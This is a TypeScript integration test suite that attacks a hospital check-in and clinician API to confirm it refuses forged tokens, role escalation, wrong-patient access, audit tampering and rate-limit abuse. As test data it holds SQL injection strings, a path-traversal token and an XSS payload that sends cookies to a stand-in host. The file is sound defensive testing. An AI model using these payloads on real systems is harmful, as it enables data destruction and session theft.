import { randomUUID, createHash } from 'node:crypto';
import { Test, type TestingModule } from '@nestjs/testing';
import type { INestApplication } from '@nestjs/common';
import request from 'supertest';
import type { Kysely } from 'kysely';
import { sql } from 'kysely';
import {
  API_BASE_PATH,
  CORRELATION_ID_HEADER,
  KIOSK_DEVICE_HEADER,
} from '@medikiosk/api-contracts';
import { NO_DIAGNOSIS_STATEMENT, PROVENANCE_LABELS } from '@medikiosk/terminology';
import type { Database } from '../src/db/database.types';
import { AppModule } from '../src/app.module';
import { DomainExceptionFilter } from '../src/common/domain-exception.filter';
import { RetentionService } from '../src/security/retention.service';
import { createTestDb, seedFixture, truncateAll, type Fixture } from './db-fixture';

/**
 * The attacks named in the specification's security-test list, actually attempted.
 *
 * Written as adversarial tests rather than feature tests: each one tries to do something
 * the system must refuse, and passes only when the refusal holds. Several of these
 * duplicate a property asserted elsewhere from the feature side — that is deliberate. A
 * property proven by the code that implements it is proven by its author's assumptions;
 * the same property attacked from outside is proven against them.
 */
describe('security (integration)', () => {
  let app: INestApplication;
  let moduleRef: TestingModule;
  let db: Kysely<Database>;
  let fx: Fixture;
  let preCheckinId: string;
  let encounterId: string;

  const http = () => request(app.getHttpServer());
  const base = (): Record<string, string> => ({ [CORRELATION_ID_HEADER]: randomUUID() });
  const kiosk = (code = 'MK-OPD-01'): Record<string, string> => ({
    ...base(),
    [KIOSK_DEVICE_HEADER]: code,
  });
  const as = (token: string): Record<string, string> => ({
    ...base(),
    authorization: `Bearer ${token}`,
  });

  const signIn = async (
    subject: string,
    role: 'CLINICIAN' | 'GOVERNANCE_REVIEWER' | 'OPERATIONS',
    departmentId?: string | null,
  ): Promise<string> => {
    await db
      .insertInto('staff_user')
      .values({
        hospital_id: fx.hospitalId,
        subject,
        display_name: subject,
        role,
        department_id: departmentId === undefined ? fx.departmentId : departmentId,
      })
      .execute();
    const res = await http()
      .post('/v1/doctor/session')
      .set(base())
      .send({ credential: `sandbox:${subject}` })
      .expect(201);
    return res.body.token as string;
  };

  beforeAll(async () => {
    db = await createTestDb();
    moduleRef = await Test.createTestingModule({ imports: [AppModule] }).compile();
    app = moduleRef.createNestApplication();
    app.setGlobalPrefix(API_BASE_PATH.replace(/^\//, ''), { exclude: ['health', 'health/ready'] });
    app.useGlobalFilters(new DomainExceptionFilter());
    await app.init();
  });

  afterAll(async () => {
    await app.close();
    await db.destroy();
  });

  beforeEach(async () => {
    await truncateAll(db);
    fx = await seedFixture(db);
    await db.deleteFrom('pre_checkin').execute();
    await db.deleteFrom('consent').execute();

    const consent = await db
      .insertInto('consent')
      .values({
        patient_id: fx.patientId,
        hospital_id: fx.hospitalId,
        purpose: 'OPD clinical intake and consultation',
        data_categories: ['demographics', 'clinical-history'],
        language_tag: 'en',
        notice_version: 'v1.0',
        state: 'GRANTED',
        capture_method: 'MOBILE_PWA',
        valid_until: new Date(Date.now() + 86_400_000),
      })
      .returningAll()
      .executeTakeFirstOrThrow();

    const pre = await db
      .insertInto('pre_checkin')
      .values({
        patient_id: fx.patientId,
        consent_id: consent.id,
        hospital_id: fx.hospitalId,
        branch_id: fx.branchId,
        department_id: fx.departmentId,
        visit_type: 'NEW_COMPLAINT',
        visit_window_start: new Date(Date.now() - 3_600_000),
        visit_window_end: new Date(Date.now() + 3_600_000),
        state: 'ARRIVAL_CONFIRMED',
      })
      .returningAll()
      .executeTakeFirstOrThrow();
    preCheckinId = pre.id;

    const encounter = await db
      .insertInto('encounter')
      .values({
        patient_id: fx.patientId,
        department_id: fx.departmentId,
        pre_checkin_id: preCheckinId,
        visit_type: 'NEW_COMPLAINT',
        his_token: 'AYU-0001',
        token_issued_at: new Date(),
      })
      .returningAll()
      .executeTakeFirstOrThrow();
    encounterId = encounter.id;
  });

  describe('authentication bypass', () => {
    it('refuses every clinical and governance endpoint with no credential', async () => {
      await http().get('/v1/doctor/worklist').set(base()).expect(401);
      await http().get(`/v1/doctor/encounters/${encounterId}`).set(base()).expect(401);
      await http().get('/v1/governance/releases').set(base()).expect(401);
      await http().post(`/v1/doctor/encounters/${encounterId}/export`).set(base()).expect(401);
    });

    it('refuses a forged bearer token', async () => {
      for (const forged of [
        'Bearer ',
        'Bearer null',
        'Bearer undefined',
        `Bearer ${'a'.repeat(43)}`,
        'Bearer ../../etc/passwd',
      ]) {
        await http()
          .get('/v1/doctor/worklist')
          .set({ ...base(), authorization: forged })
          .expect(401);
      }
    });

    it('refuses a session token that was revoked', async () => {
      const token = await signIn('dr.a', 'CLINICIAN');
      await http().post('/v1/doctor/session/end').set(as(token)).expect(201);
      await http().get('/v1/doctor/worklist').set(as(token)).expect(401);
    });

    it('refuses a session token that has expired', async () => {
      const token = await signIn('dr.b', 'CLINICIAN');
      // `staff_session_expires_after_issue` refuses an expiry before its own issue time,
      // so the whole session is moved into the past rather than just its expiry.
      await db
        .updateTable('staff_session')
        .set({
          issued_at: new Date(Date.now() - 10 * 60 * 60 * 1000),
          expires_at: new Date(Date.now() - 1000),
        })
        .execute();
      await http().get('/v1/doctor/worklist').set(as(token)).expect(401);
    });

    it('refuses a session belonging to a disabled account', async () => {
      const token = await signIn('dr.c', 'CLINICIAN');
      await db.updateTable('staff_user').set({ enabled: false }).execute();
      // Disabling an account must end access immediately, not at the next sign-in.
      await http().get('/v1/doctor/worklist').set(as(token)).expect(401);
    });

    it('stores no usable session token, so a stolen database yields no access', async () => {
      const token = await signIn('dr.d', 'CLINICIAN');
      const row = await db.selectFrom('staff_session').selectAll().executeTakeFirstOrThrow();

      expect(row.token_hash).not.toBe(token);
      expect(row.token_hash).toBe(createHash('sha256').update(token).digest('hex'));
    });

    it('refuses a kiosk device code that is not provisioned', async () => {
      await http().get('/v1/kiosk/config').set(kiosk('MK-FORGED')).expect(400);
      await http().get('/v1/kiosk/config').set(base()).expect(400);
    });
  });

  describe('role escalation', () => {
    it('does not let a clinician release clinical content', async () => {
      const token = await signIn('dr.e', 'CLINICIAN');
      await http()
        .post('/v1/governance/releases')
        .set(as(token))
        .send({ contentKind: 'QUESTIONNAIRE', contentKey: 'x/en', semver: '1.0.0', payload: {} })
        .expect(403);
    });

    it('does not let a governance reviewer read a patient record', async () => {
      const token = await signIn('gov.a', 'GOVERNANCE_REVIEWER', null);
      await http().get(`/v1/doctor/encounters/${encounterId}`).set(as(token)).expect(403);
      await http().get('/v1/doctor/worklist').set(as(token)).expect(403);
    });

    it('does not let operations staff read a patient record', async () => {
      const token = await signIn('ops.a', 'OPERATIONS', null);
      await http().get(`/v1/doctor/encounters/${encounterId}`).set(as(token)).expect(403);
    });

    it('ignores a role claimed in the request', async () => {
      const token = await signIn('ops.b', 'OPERATIONS', null);
      // The role comes from the staff record, never from anything the caller sends.
      await http()
        .get('/v1/doctor/worklist')
        .set({ ...as(token), 'x-role': 'CLINICIAN', 'x-staff-role': 'CLINICIAN' })
        .expect(403);
    });
  });

  describe('wrong-patient access', () => {
    it('refuses a record in another department without a reason', async () => {
      const other = await db
        .insertInto('department')
        .values({ branch_id: fx.branchId, code: 'OTH', name: 'Other', ayush_system: 'UNANI' })
        .returningAll()
        .executeTakeFirstOrThrow();
      const token = await signIn('dr.f', 'CLINICIAN', other.id);

      await http().get(`/v1/doctor/encounters/${encounterId}`).set(as(token)).expect(403);
    });

    it('refuses a record at another hospital, indistinguishably from one that does not exist', async () => {
      const otherHospital = await db
        .insertInto('hospital')
        .values({ code: 'H2', name: 'Other hospital' })
        .returningAll()
        .executeTakeFirstOrThrow();
      const token = await signIn('dr.g', 'CLINICIAN', null);
      await db
        .updateTable('staff_user')
        .set({ hospital_id: otherHospital.id })
        .where('subject', '=', 'dr.g')
        .execute();

      const foreign = await http()
        .get(`/v1/doctor/encounters/${encounterId}`)
        .set(as(token))
        .expect(403);
      const absent = await http()
        .get(`/v1/doctor/encounters/${randomUUID()}`)
        .set(as(token))
        .expect(403);

      // Everything but the correlation id, which is per-request by design.
      expect({ ...foreign.body, correlationId: null }).toEqual({
        ...absent.body,
        correlationId: null,
      });
    });

    it('does not let a kiosk read a visit belonging to another hospital', async () => {
      const otherHospital = await db
        .insertInto('hospital')
        .values({ code: 'H3', name: 'Third hospital' })
        .returningAll()
        .executeTakeFirstOrThrow();
      await db
        .updateTable('pre_checkin')
        .set({ hospital_id: otherHospital.id })
        .where('id', '=', preCheckinId)
        .execute();

      await http().get(`/v1/precheckins/${preCheckinId}/documents`).set(kiosk()).expect(400);
    });
  });

  describe('injection', () => {
    it('treats SQL metacharacters in a path parameter as data', async () => {
      for (const payload of [
        "' OR '1'='1",
        "'; DROP TABLE patient; --",
        "1' UNION SELECT * FROM staff_session --",
      ]) {
        await http()
          .get(`/v1/precheckins/${encodeURIComponent(payload)}/documents`)
          .set(kiosk())
          .expect(400);
      }

      // The point of the test: the tables are still there.
      const patients = await db.selectFrom('patient').selectAll().execute();
      expect(patients.length).toBeGreaterThan(0);
    });

    it('treats SQL metacharacters in a body field as data', async () => {
      const res = await http()
        .post('/v1/identity/otp')
        .set(kiosk())
        .send({ mobile: "9876543210'; DROP TABLE patient; --", purpose: 'NEW_REGISTRATION' })
        .expect(400);

      expect(res.body.code).toBe('VALIDATION_FAILED');
      expect(await db.selectFrom('patient').selectAll().execute()).not.toHaveLength(0);
    });

    it('stores a script payload as inert text, never as markup', async () => {
      const token = await signIn('gov.b', 'GOVERNANCE_REVIEWER', null);
      const xss = '<script>fetch("https://evil.example/"+document.cookie)</script>';

      const res = await http()
        .post('/v1/governance/releases')
        .set(as(token))
        .send({
          contentKind: 'TERMINOLOGY',
          contentKey: `terms/${xss}`,
          semver: '1.0.0',
          payload: { note: xss },
        })
        .expect(201);

      const row = await db
        .selectFrom('governance_version')
        .selectAll()
        .where('id', '=', res.body.releaseId)
        .executeTakeFirstOrThrow();

      // Stored verbatim and returned as JSON, never interpolated into a document. The
      // escaping obligation is the renderer's; what matters here is that the API does not
      // execute or transform it.
      expect(row.content_key).toBe(`terms/${xss}`);
      expect(res.headers['content-type']).toContain('application/json');
    });
  });

  describe('audit tampering', () => {
    it('silently discards an UPDATE to the audit trail', async () => {
      // An action that actually audits. Reading the kiosk config does not, which is
      // correct — it is configuration, not a protected action.
      await http()
        .post('/v1/identity/otp')
        .set(kiosk())
        .send({ mobile: '9876543210', purpose: 'NEW_REGISTRATION' })
        .expect(201);
      const before = await db.selectFrom('audit_event').selectAll().execute();
      expect(before.length).toBeGreaterThan(0);

      await sql`UPDATE audit_event SET action = 'NOTHING_HAPPENED'`.execute(db);

      const after = await db.selectFrom('audit_event').selectAll().execute();
      // The RULE makes the update a no-op rather than an error. Worth knowing: an attacker
      // with SQL access gets no error and no change, and a legitimate migration that tried
      // to rewrite history would also silently do nothing.
      expect(after.map((e) => e.action)).toEqual(before.map((e) => e.action));
    });

    it('silently discards a DELETE from the audit trail', async () => {
      await http()
        .post('/v1/identity/otp')
        .set(kiosk())
        .send({ mobile: '9876543210', purpose: 'NEW_REGISTRATION' })
        .expect(201);
      const before = await db.selectFrom('audit_event').selectAll().execute();
      expect(before.length).toBeGreaterThan(0);

      await sql`DELETE FROM audit_event`.execute(db);

      expect(await db.selectFrom('audit_event').selectAll().execute()).toHaveLength(before.length);
    });
  });

  describe('information disclosure', () => {
    it('never returns a stack trace, SQL text or a constraint name', async () => {
      const responses = [
        await http().get('/v1/precheckins/not-a-uuid/documents').set(kiosk()),
        await http().post('/v1/doctor/session').set(base()).send({ credential: 'x' }),
        await http().get(`/v1/precheckins/${randomUUID()}/review`).set(kiosk()),
      ];

      for (const res of responses) {
        const body = JSON.stringify(res.body);
        expect(body).not.toMatch(/at .*\.ts:\d+/);
        expect(body).not.toMatch(/select |insert into|violates|constraint/i);
        expect(Object.keys(res.body).sort()).toEqual(['code', 'correlationId', 'patientMessage']);
      }
    });

    it('does not reveal whether a mobile number belongs to a patient', async () => {
      const known = await http()
        .post('/v1/identity/otp')
        .set(kiosk())
        .send({ mobile: '9876543210', purpose: 'EXISTING_PATIENT_LOOKUP' })
        .expect(201);
      const unknown = await http()
        .post('/v1/identity/otp')
        .set(kiosk())
        .send({ mobile: '9000000001', purpose: 'EXISTING_PATIENT_LOOKUP' })
        .expect(201);

      // Identical shape, or the kiosk becomes a way to test which numbers are registered.
      expect(Object.keys(known.body).sort()).toEqual(Object.keys(unknown.body).sort());
    });

    it('never logs an OTP or a full mobile number in the audit trail', async () => {
      await http()
        .post('/v1/identity/otp')
        .set(kiosk())
        .send({ mobile: '9876543210', purpose: 'NEW_REGISTRATION' })
        .expect(201);

      const events = await db.selectFrom('audit_event').selectAll().execute();
      const serialised = JSON.stringify(events);
      expect(serialised).not.toContain('9876543210');
    });
  });

  describe('session leakage between patients', () => {
    it('does not let one kiosk session act on another session’s visit', async () => {
      const first = await http().post('/v1/kiosk/sessions').set(kiosk()).expect(201);
      const second = await http().post('/v1/kiosk/sessions').set(kiosk()).expect(201);

      expect(first.body.sessionId).not.toBe(second.body.sessionId);

      await db
        .updateTable('kiosk_session')
        .set({ state: 'IDENTITY_CONFIRMED', patient_id: fx.patientId })
        .where('id', '=', first.body.sessionId)
        .execute();

      // The second session has no confirmed patient, so it cannot open a visit — even
      // though the first one, on the same device, does.
      await http()
        .post(`/v1/kiosk/sessions/${second.body.sessionId}/visit`)
        .set(kiosk())
        .send({ departmentCode: 'AYU-OPD' })
        .expect(403);
    });

    it('cannot revive a session that has ended', async () => {
      const started = await http().post('/v1/kiosk/sessions').set(kiosk()).expect(201);
      await http()
        .post(`/v1/kiosk/sessions/${started.body.sessionId}/end`)
        .set(kiosk())
        .send({ reason: 'EXIT', wiped: true })
        .expect(201);

      await http()
        .post(`/v1/kiosk/sessions/${started.body.sessionId}/activity`)
        .set(kiosk())
        .expect(410);
    });
  });

  describe('document links', () => {
    it('refuses a document link with a tampered signature', async () => {
      const token = await signIn('dr.h', 'CLINICIAN');
      const document = await db
        .insertInto('document')
        .values({
          pre_checkin_id: preCheckinId,
          patient_id: fx.patientId,
          document_type: 'PRESCRIPTION',
          object_key: `k/${randomUUID()}`,
          content_type: 'image/jpeg',
          byte_size: '26',
          sha256: 'a'.repeat(64),
          state: 'STORED',
          encryption_key_id: 'test-key',
          malware_scanned_at: new Date(),
        })
        .returningAll()
        .executeTakeFirstOrThrow();

      const view = await http()
        .get(`/v1/doctor/encounters/${encounterId}`)
        .set(as(token))
        .expect(200);
      const url: string = view.body.documents[0].link.url;

      await http().get(url.replace(/sig=./, 'sig=Z')).set(base()).expect(403);
      await http()
        .get(url.replace(/exp=\d+/, 'exp=9999999999'))
        .set(base())
        .expect(403);
      await http().get(`/v1/doctor/documents/${document.id}/original`).set(base()).expect(403);
    });

    it('refuses a link issued to a different member of staff', async () => {
      const owner = await signIn('dr.i', 'CLINICIAN');
      await db
        .insertInto('document')
        .values({
          pre_checkin_id: preCheckinId,
          patient_id: fx.patientId,
          document_type: 'PRESCRIPTION',
          object_key: `k/${randomUUID()}`,
          content_type: 'image/jpeg',
          byte_size: '26',
          sha256: 'b'.repeat(64),
          state: 'STORED',
          encryption_key_id: 'test-key',
          malware_scanned_at: new Date(),
        })
        .execute();

      const view = await http()
        .get(`/v1/doctor/encounters/${encounterId}`)
        .set(as(owner))
        .expect(200);
      const url: string = view.body.documents[0].link.url;

      // A link pasted into a chat is useless to whoever receives it, even in the window.
      const otherStaff = await db
        .insertInto('staff_user')
        .values({
          hospital_id: fx.hospitalId,
          subject: 'dr.j',
          display_name: 'dr.j',
          role: 'CLINICIAN',
          department_id: fx.departmentId,
        })
        .returningAll()
        .executeTakeFirstOrThrow();

      await http()
        .get(url.replace(/sub=[^&]+/, `sub=${otherStaff.id}`))
        .set(base())
        .expect(403);
    });
  });

  describe('rate limits', () => {
    const requestOtp = (mobile: string, code = 'MK-OPD-01') =>
      http()
        .post('/v1/identity/otp')
        .set(kiosk(code))
        .send({ mobile, purpose: 'NEW_REGISTRATION' });

    it('refuses OTP flooding of one number', async () => {
      // Three per fifteen minutes, enforced by OtpService since Phase 5. Sending SMS to
      // someone else's phone repeatedly is harassment, and it costs money.
      for (let i = 0; i < 3; i++) await requestOtp('9876543210').expect(201);
      const blocked = await requestOtp('9876543210').expect(429);
      expect(blocked.body.code).toBe('RATE_LIMITED');
    });

    it('limits a kiosk turned into an SMS pump across many numbers', async () => {
      // Each number is under its own limit; the per-device bucket is what catches this.
      // Each number is well under its own per-number limit; only the per-device bucket
      // catches a kiosk walking through a list.
      for (let i = 0; i < 30; i++) {
        await requestOtp(`98765${String(10000 + i)}`).expect(201);
      }
      await requestOtp('9999999999').expect(429);
    });

    it('cannot be bypassed by changing the correlation id or any client-set header', async () => {
      for (let i = 0; i < 3; i++) await requestOtp('9811111111').expect(201);

      // A fresh correlation id per request is normal traffic, not a new identity.
      await requestOtp('9811111111').expect(429);
      // And the limit is keyed on the number itself, not on anything the client controls.
      await http()
        .post('/v1/identity/otp')
        .set({ ...kiosk(), 'x-forwarded-for': '10.0.0.9' })
        .send({ mobile: '9811111111', purpose: 'EXISTING_PATIENT_LOOKUP' })
        .expect(429);
    });

    it('limits staff sign-in attempts, so credentials cannot be stuffed', async () => {
      for (let i = 0; i < 10; i++) {
        await http()
          .post('/v1/doctor/session')
          .set(base())
          .send({ credential: 'sandbox:nobody' })
          .expect(401);
      }
      await http()
        .post('/v1/doctor/session')
        .set(base())
        .send({ credential: 'sandbox:nobody' })
        .expect(429);
    });

    it('counts a refused attempt, so failure is not free', async () => {
      // The whole point: if only successes counted, an attacker guessing wrong forever
      // would never be limited.
      for (let i = 0; i < 10; i++) {
        await http()
          .post('/v1/doctor/session')
          .set(base())
          .send({ credential: 'garbage' })
          .expect(401);
      }
      await http()
        .post('/v1/doctor/session')
        .set(base())
        .send({ credential: 'garbage' })
        .expect(429);
    });

    it('does not record which number was limited', async () => {
      for (let i = 0; i < 4; i++) await requestOtp('9822222222');

      const buckets = await db.selectFrom('rate_limit_bucket').selectAll().execute();
      // A leaked backup of this table must not be a list of who tried to check in.
      expect(JSON.stringify(buckets)).not.toContain('9822222222');
      expect(buckets.length).toBeGreaterThan(0);
    });
  });

  describe('retention and legal hold', () => {
    const policy = async (dataKind: string, retainDays: number): Promise<void> => {
      await db
        .insertInto('retention_policy')
        .values({
          hospital_id: fx.hospitalId,
          data_kind: dataKind,
          retain_days: retainDays,
          approved_by: 'Hospital information governance committee',
          approved_at: new Date(),
        })
        .execute();
    };

    const oldAttempt = async (patientId: string | null): Promise<string> => {
      const row = await db
        .insertInto('identity_attempt')
        .values({
          hospital_id: fx.hospitalId,
          method: 'MOBILE_OTP',
          strength: 'MODERATE',
          candidate_count: 1,
          matched_patient_id: patientId,
          outcome: 'MATCHED',
          correlation_id: randomUUID(),
          created_at: new Date(Date.now() - 400 * 86_400_000),
        })
        .returningAll()
        .executeTakeFirstOrThrow();
      return row.id;
    };

    it('deletes nothing when the hospital has approved no policy', async () => {
      await oldAttempt(fx.patientId);
      const retention = moduleRef.get(RetentionService);

      const reports = await retention.purge({
        hospitalId: fx.hospitalId,
        correlationId: randomUUID(),
        actorId: 'system',
      });

      // An absent policy is an unanswered question, not permission to delete.
      expect(reports).toHaveLength(0);
      expect(await db.selectFrom('identity_attempt').selectAll().execute()).toHaveLength(1);
    });

    it('deletes data past its approved retention period', async () => {
      await oldAttempt(null);
      await policy('IDENTITY_ATTEMPT', 365);
      const retention = moduleRef.get(RetentionService);

      const reports = await retention.purge({
        hospitalId: fx.hospitalId,
        correlationId: randomUUID(),
        actorId: 'system',
      });

      expect(reports[0]?.deleted).toBe(1);
      expect(await db.selectFrom('identity_attempt').selectAll().execute()).toHaveLength(0);
    });

    it('a legal hold beats the retention policy', async () => {
      await oldAttempt(fx.patientId);
      await policy('IDENTITY_ATTEMPT', 365);
      await db
        .insertInto('legal_hold')
        .values({
          hospital_id: fx.hospitalId,
          patient_id: fx.patientId,
          reason: 'complaint under investigation by the state health commission',
          placed_by: 'hospital legal office',
        })
        .execute();

      const retention = moduleRef.get(RetentionService);
      const reports = await retention.purge({
        hospitalId: fx.hospitalId,
        correlationId: randomUUID(),
        actorId: 'system',
      });

      // Keeping data too long is a privacy fault; destroying it under a hold is
      // spoliation of evidence. The two are not comparable, so the hold always wins.
      expect(reports[0]?.heldBack).toBe(1);
      expect(reports[0]?.deleted).toBe(0);
      expect(await db.selectFrom('identity_attempt').selectAll().execute()).toHaveLength(1);
    });

    it('resumes deleting once the hold is released', async () => {
      await oldAttempt(fx.patientId);
      await policy('IDENTITY_ATTEMPT', 365);
      await db
        .insertInto('legal_hold')
        .values({
          hospital_id: fx.hospitalId,
          patient_id: fx.patientId,
          reason: 'complaint under investigation by the state health commission',
          placed_by: 'hospital legal office',
          released_at: new Date(),
          released_by: 'hospital legal office',
        })
        .execute();

      const retention = moduleRef.get(RetentionService);
      const reports = await retention.purge({
        hospitalId: fx.hospitalId,
        correlationId: randomUUID(),
        actorId: 'system',
      });
      expect(reports[0]?.deleted).toBe(1);
    });

    it('a hold must name what it holds and say why', async () => {
      await expect(
        db
          .insertInto('legal_hold')
          .values({
            hospital_id: fx.hospitalId,
            reason: 'a complaint is being investigated',
            placed_by: 'legal',
          })
          .execute(),
      ).rejects.toThrow();

      await expect(
        db
          .insertInto('legal_hold')
          .values({
            hospital_id: fx.hospitalId,
            patient_id: fx.patientId,
            reason: 'short',
            placed_by: 'legal',
          })
          .execute(),
      ).rejects.toThrow();
    });

    it('plans without deleting, so a purge can be checked before it runs', async () => {
      await oldAttempt(null);
      await policy('IDENTITY_ATTEMPT', 365);
      const retention = moduleRef.get(RetentionService);

      const plan = await retention.plan(fx.hospitalId);
      expect(plan[0]?.eligible).toBe(1);
      expect(plan[0]?.deleted).toBe(0);
      expect(await db.selectFrom('identity_attempt').selectAll().execute()).toHaveLength(1);
    });

    it('never deletes the audit trail', async () => {
      await http()
        .post('/v1/identity/otp')
        .set(kiosk())
        .send({ mobile: '9876543210', purpose: 'NEW_REGISTRATION' })
        .expect(201);
      await policy('IDENTITY_ATTEMPT', 1);
      await policy('KIOSK_SESSION', 1);

      const before = await db.selectFrom('audit_event').selectAll().execute();
      const retention = moduleRef.get(RetentionService);
      await retention.purge({
        hospitalId: fx.hospitalId,
        correlationId: randomUUID(),
        actorId: 'system',
      });

      // A deletion nobody can prove happened is not a deletion anybody can defend, so the
      // record of who did what outlives the clinical data it describes.
      const after = await db.selectFrom('audit_event').selectAll().execute();
      expect(after.length).toBeGreaterThanOrEqual(before.length);
    });
  });

  describe('export and confirmation cannot be forged', () => {
    it('refuses to export a record no clinician confirmed', async () => {
      const token = await signIn('dr.k', 'CLINICIAN');
      await http().post(`/v1/doctor/encounters/${encounterId}/export`).set(as(token)).expect(400);
    });

    it('refuses a summary claiming to be clinician-verified without a clinician', async () => {
      await expect(
        db
          .insertInto('clinical_summary')
          .values({
            pre_checkin_id: preCheckinId,
            generator: 'MODEL',
            generator_version: 'forged',
            content: JSON.stringify({ narrative: NO_DIAGNOSIS_STATEMENT, sections: [] }),
            validation_state: 'ACCEPTED',
            rejection_reasons: JSON.stringify([]),
            provenance_label: PROVENANCE_LABELS.CLINICIAN_VERIFIED,
            correlation_id: randomUUID(),
          })
          .execute(),
      ).rejects.toThrow();
    });
  });
});
